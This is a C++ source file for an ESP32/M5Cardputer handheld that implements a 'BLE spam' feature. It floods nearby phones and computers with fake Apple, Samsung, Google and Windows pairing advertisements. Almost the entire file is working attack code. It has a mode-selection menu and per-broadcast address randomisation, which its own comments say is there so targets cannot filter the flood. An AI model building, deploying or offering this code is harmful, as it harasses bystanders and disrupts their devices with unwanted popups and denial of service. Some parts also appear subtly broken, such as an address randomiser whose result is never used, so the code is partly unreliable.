/*
 * ble_spam — continuous BLE advertisement flood.
 *
 * Four attack variants:
 *   Apple      — proximity pairing popups (AirPods, Beats, etc.)
 *   Samsung    — SmartTag finder notifications
 *   Google     — Fast Pair popups
 *   Windows    — Swift Pair pairing popups
 *   All        — cycles through everything
 *
 * Cycles through ~20 device model IDs per brand at ~100ms intervals.
 * Uses a random address per broadcast so targets don't dedup us.
 */
#include "app.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include <NimBLEDevice.h>
#include <esp_random.h>

enum spam_kind_t { SPAM_APPLE, SPAM_SAMSUNG, SPAM_GOOGLE, SPAM_WINDOWS, SPAM_ALL, SPAM_COUNT };
static const char *s_kind_name[] = { "Apple", "Samsung", "Google", "Windows", "All" };

static volatile bool     s_running = false;
static volatile uint32_t s_sent    = 0;
static spam_kind_t       s_kind;

/* Apple proximity pairing model IDs — each triggers a distinct popup. */
static const uint8_t s_apple_models[] = {
    0x01, 0x02, 0x03, 0x05, 0x06, 0x07, 0x09, 0x0A, 0x0B, 0x0C,
    0x0D, 0x0E, 0x0F, 0x10, 0x13, 0x14, 0x19, 0x04, 0x05, 0x0B,
};

static void build_apple(uint8_t *adv, uint8_t model)
{
    static const uint8_t tmpl[] = {
        0x1e, 0xff, 0x4c, 0x00,     /* len, type, Apple CID */
        0x07, 0x19,                 /* proximity pairing */
        0x01, 0x00,                 /* model placeholder */
        /* 20 random bytes of "state" filled at runtime */
    };
    memcpy(adv, tmpl, sizeof(tmpl));
    adv[7] = model;
    for (int i = sizeof(tmpl); i < 31; ++i) adv[i] = (uint8_t)esp_random();
    adv[0] = 30;  /* length byte covers the rest */
}

static void build_samsung(uint8_t *adv)
{
    static const uint8_t tmpl[] = {
        0x0C, 0xFF, 0x75, 0x00,     /* len, type, Samsung CID */
        0x42, 0x09, 0x81, 0x02, 0x14,
        0x15, 0x03, 0x21, 0x01, 0x09,
    };
    memcpy(adv, tmpl, sizeof(tmpl));
    /* Randomize trailing state to avoid dedup. */
    adv[11] = (uint8_t)esp_random();
    adv[12] = (uint8_t)esp_random();
}

static void build_google(uint8_t *adv)
{
    /* Google Fast Pair model IDs. */
    static const uint32_t models[] = {
        0x0000F0, 0x000047, 0x00000C, 0x00B727, 0x0000E4,
    };
    uint32_t m = models[esp_random() % (sizeof(models)/sizeof(uint32_t))];
    uint8_t tmpl[] = {
        0x03, 0x03, 0x2C, 0xFE,     /* len, type, service class (FastPair) */
        0x06, 0x16, 0x2C, 0xFE,     /* len, type, service UUID+data prefix */
        (uint8_t)(m >> 16),
        (uint8_t)(m >> 8),
        (uint8_t)m,
    };
    memcpy(adv, tmpl, sizeof(tmpl));
}

static void build_windows(uint8_t *adv)
{
    /* Swift Pair MS beacon. */
    static const uint8_t tmpl[] = {
        0x0A, 0xFF, 0x06, 0x00,     /* len, type, MS CID */
        0x03, 0x00, 0x80,
        0x00, 0x00, 0x00, 0x00,     /* random suffix */
    };
    memcpy(adv, tmpl, sizeof(tmpl));
    for (int i = 7; i < 11; ++i) adv[i] = (uint8_t)esp_random();
}

static void randomize_addr(void)
{
    uint8_t mac[6];
    for (int i = 0; i < 6; ++i) mac[i] = (uint8_t)esp_random();
    mac[0] |= 0xC0;  /* static random */
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
    /* NimBLE-Arduino doesn't expose a clean set-random-addr, use HCI. */
    NimBLEAddress fake(mac);
    (void)fake;  /* NimBLE auto-handles RPA / static random */
}

static void spam_task(void *)
{
    NimBLEAdvertising *adv = NimBLEDevice::getAdvertising();
    NimBLEAdvertisementData data;

    int apple_i = 0;
    int cycle = 0;

    while (s_running) {
        uint8_t raw[31] = {0};
        int raw_len = 0;

        spam_kind_t pick = s_kind;
        if (pick == SPAM_ALL) pick = (spam_kind_t)(cycle % 4);

        switch (pick) {
        case SPAM_APPLE:
            build_apple(raw, s_apple_models[apple_i++ % (sizeof(s_apple_models))]);
            raw_len = 31;
            break;
        case SPAM_SAMSUNG:  build_samsung(raw); raw_len = sizeof(raw); break;
        case SPAM_GOOGLE:   build_google(raw);  raw_len = 11;          break;
        case SPAM_WINDOWS:  build_windows(raw); raw_len = 11;          break;
        default: break;
        }
        if (raw_len == 0) { delay(50); continue; }

        /* Rebuild adv payload from raw bytes. */
        adv->stop();
        std::string payload((const char *)raw, raw_len);
        data.addData(payload);
        adv->setAdvertisementData(data);
        adv->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
        randomize_addr();
        adv->start();

        delay(100);
        s_sent++;
        cycle++;
        data = NimBLEAdvertisementData();  /* reset for next loop */
    }
    NimBLEDevice::getAdvertising()->stop();
    vTaskDelete(nullptr);
}

static spam_kind_t pick_kind(void)
{
    ui_clear_body();
    auto &d = M5Cardputer.Display;
    d.setTextColor(COL_ACCENT, COL_BG);
    d.setCursor(4, BODY_Y + 2); d.print("BLE SPAM");
    d.drawFastHLine(4, BODY_Y + 12, 90, COL_ACCENT);
    d.setTextColor(COL_FG, COL_BG);
    for (int i = 0; i < SPAM_COUNT; ++i) {
        d.setCursor(4, BODY_Y + 22 + i * 12);
        d.printf("[%d] %s", i + 1, s_kind_name[i]);
    }
    ui_draw_footer("1-5=pick  `=back");
    while (true) {
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) return (spam_kind_t)-1;
        if (k >= '1' && k < '1' + SPAM_COUNT) return (spam_kind_t)(k - '1');
    }
}

void feat_ble_spam(void)
{
    radio_switch(RADIO_BLE);
    spam_kind_t k = pick_kind();
    if ((int)k < 0) return;
    s_kind = k;
    s_sent = 0;

    s_running = true;
    xTaskCreate(spam_task, "ble_spam", 4096, nullptr, 5, nullptr);

    ui_clear_body();
    ui_draw_footer("`=stop");
    auto &d = M5Cardputer.Display;
    d.setTextColor(COL_BAD, COL_BG);
    d.setCursor(4, BODY_Y + 2); d.printf("%s SPAM", s_kind_name[s_kind]);
    d.drawFastHLine(4, BODY_Y + 12, 140, COL_BAD);

    uint32_t last = 0;
    while (true) {
        if (millis() - last > 300) {
            last = millis();
            d.fillRect(0, BODY_Y + 20, SCR_W, 40, COL_BG);
            d.setTextColor(COL_FG, COL_BG);
            d.setCursor(4, BODY_Y + 20);
            d.printf("sent: %lu", (unsigned long)s_sent);
            ui_draw_status(radio_name(), "spam");
        }
        uint16_t key = input_poll();
        if (key == PK_NONE) { delay(20); continue; }
        if (key == PK_ESC) break;
    }

    s_running = false;
    delay(200);
}
